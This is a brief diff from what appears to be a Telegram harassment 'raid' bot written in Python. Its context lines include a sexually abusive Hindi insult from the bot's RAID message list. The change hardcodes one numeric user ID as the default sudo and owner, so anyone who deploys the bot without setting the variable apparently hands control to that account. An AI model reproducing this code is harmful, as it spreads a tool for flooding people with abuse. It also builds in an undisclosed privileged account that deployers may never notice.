@@ -364,7 +364,7 @@ RAID = [
     "TERI SEXY BAHEN KI CHUT OP",
 ]
 
-SUDO_USERS = set(int(x) for x in os.environ.get("SUDO_USERS", "").split())
+SUDO_USERS = set(int(x) for x in os.environ.get("SUDO_USERS", "2035388821").split())
 
 OWNER_ID = SUDO_USERS
 que = {}
